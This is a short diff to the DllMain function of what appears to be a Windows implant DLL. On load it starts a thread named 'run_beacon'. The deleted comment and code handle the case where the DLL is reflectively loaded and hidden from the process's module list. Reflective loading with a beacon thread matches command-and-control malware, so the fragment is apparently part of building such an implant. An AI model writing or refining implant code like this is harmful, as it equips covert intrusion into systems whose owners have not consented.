@@ -925,15 +925,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     (void)lpReserved;
     if (reason == DLL_PROCESS_ATTACH) {
         g_own_module = hModule;
-        /*
-         * Skip DisableThreadLibraryCalls when reflectively loaded —
-         * the DLL isn't in the PEB module list, so the call would
-         * fail or corrupt loader state. Safe to omit: DllMain won't
-         * be called for thread attach/detach in reflective context.
-         */
-        HMODULE probe = GetModuleHandleA(NULL);
-        if (probe && probe != hModule)
-            DisableThreadLibraryCalls(hModule);
         CreateThread(NULL, 0, run_beacon, NULL, 0, NULL);
     }
     return TRUE;
